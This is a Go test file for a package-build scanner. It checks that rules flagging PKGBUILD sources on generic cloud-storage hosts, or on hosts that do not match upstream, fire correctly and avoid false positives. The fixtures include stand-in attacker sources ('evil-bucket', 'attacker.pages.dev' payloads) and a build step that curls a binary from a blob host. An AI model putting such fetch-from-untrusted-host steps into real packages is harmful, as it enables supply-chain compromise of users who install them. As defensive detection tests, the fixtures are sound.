package rules

import "testing"

func codes(body string) map[string]bool {
	m := map[string]bool{}
	for _, h := range Scan(map[string]string{"PKGBUILD": body}) {
		m[h.Code] = true
	}
	return m
}

func TestSRC002GenericHostFires(t *testing.T) {
	cases := map[string]string{
		"gvisor-bucket (issue #40)": `pkgname=gvisor-bin
url="https://gvisor.dev"
source=("https://storage.googleapis.com/gvisor-stable/releases/x86_64/runsc")`,
		"s3-bucket": `url="https://example.org"
source=("https://evil-bucket.s3.amazonaws.com/payload.tar.gz")`,
		"r2-dev":    `source=("https://abc.r2.dev/blob")`,
		"pages-dev": `source=("https://attacker.pages.dev/app.tar.zst")`,
		"curl-in-build": `url="https://proj.dev"
build() { curl -fsSL https://x.blob.core.windows.net/c/bin -o bin; }`,
	}
	for name, body := range cases {
		t.Run(name, func(t *testing.T) {
			if !codes(body)["SRC-002"] {
				t.Fatalf("SRC-002 did not fire for %s", name)
			}
		})
	}
}

func TestSRC003UpstreamMismatchFires(t *testing.T) {
	body := `url="https://coolproject.org"
source=("https://random-vps.example.net/coolproject-1.0.tar.gz")`
	if !codes(body)["SRC-003"] {
		t.Fatal("SRC-003 should fire when the download host matches neither url= nor a forge")
	}
}

func TestSRCProvenanceNoFalsePositives(t *testing.T) {
	clean := map[string]string{
		"github release matches forge": `url="https://github.com/foo/bar"
source=("https://github.com/foo/bar/releases/download/v1/bar-1.tar.gz")`,
		"same-domain CDN": `url="https://kernel.org"
source=("https://cdn.kernel.org/pub/linux/kernel/x.tar.xz")`,
		"gnu ftp under savannah": `url="https://www.gnu.org/software/bash"
source=("https://ftpmirror.gnu.org/bash/bash-5.2.tar.gz")`,
		"sourceforge files": `url="https://sourceforge.net/projects/foo"
source=("https://downloads.sourceforge.net/project/foo/foo.tar.gz")`,
	}
	for name, body := range clean {
		t.Run(name, func(t *testing.T) {
			c := codes(body)
			if c["SRC-002"] || c["SRC-003"] {
				t.Fatalf("false positive on %q: %v", name, c)
			}
		})
	}
}

func TestURLLineNotTreatedAsSource(t *testing.T) {
	// url= on a generic host must not itself trigger SRC-002; the actual source
	// is a clean forge.
	body := `url="https://storage.googleapis.com/project/page"
source=("git+https://github.com/foo/bar.git")`
	if codes(body)["SRC-002"] {
		t.Fatal("the url= homepage line must not be flagged as a generic-host source")
	}
}
